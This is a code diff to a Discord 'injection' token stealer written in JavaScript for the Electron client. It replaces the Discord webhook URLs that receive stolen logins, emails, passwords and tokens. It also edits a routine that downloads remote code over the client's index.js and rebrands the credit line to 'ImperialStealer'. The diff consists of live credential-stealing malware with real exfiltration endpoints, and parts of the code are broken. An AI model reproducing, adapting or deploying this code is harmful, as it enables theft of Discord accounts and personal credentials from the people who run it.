@@ -6,8 +6,8 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1202379323814989824/lvxhixPK4IGcpsMHaOGKAHlMqQ6q9im0WmWx0Jn7HFC2NCVb56l78MdI4WyP3nnXWzo2', 
-  webhook_protector_key: 'https://discord.com/api/webhooks/1201992811730174093/MJ5jICzaWxrkR1Y2EnSXewl6tzNlAFK3yaeF6P1311yx317OkhebPNkxLoq38zPnDHZG', 
+  webhook: 'https://discord.com/api/webhooks/1202556165989466152/pbKxMjTvMCHny8jR17tIARxgondqL03mvvNu4Wx416MX6ELEsVuRuW54OXqdkT6hYEBd', 
+  webhook_protector_key: 'https://discord.com/api/webhooks/1202556165989466152/pbKxMjTvMCHny8jR17tIARxgondqL03mvvNu4Wx416MX6ELEsVuRuW54OXqdkT6hYEBd', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
@@ -444,8 +444,8 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('https://discord.com/api/webhooks/1202379323814989824/lvxhixPK4IGcpsMHaOGKAHlMqQ6q9im0WmWx0Jn7HFC2NCVb56l78MdI4WyP3nnXWzo2', '${config.webhook}')
-        res.replace('https://discord.com/api/webhooks/1202379323814989824/lvxhixPK4IGcpsMHaOGKAHlMqQ6q9im0WmWx0Jn7HFC2NCVb56l78MdI4WyP3nnXWzo2', '${config.webhook_protector_key}')
+        res.replace('https://discord.com/api/webhooks/1202556165989466152/pbKxMjTvMCHny8jR17tIARxgondqL03mvvNu4Wx416MX6ELEsVuRuW54OXqdkT6hYEBd', '${config.webhook}')
+        res.replace('https://discord.com/api/webhooks/1202556165989466152/pbKxMjTvMCHny8jR17tIARxgondqL03mvvNu4Wx416MX6ELEsVuRuW54OXqdkT6hYEBd', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By mapes・t.me/ImperialStealer',
         },
       },
     ],
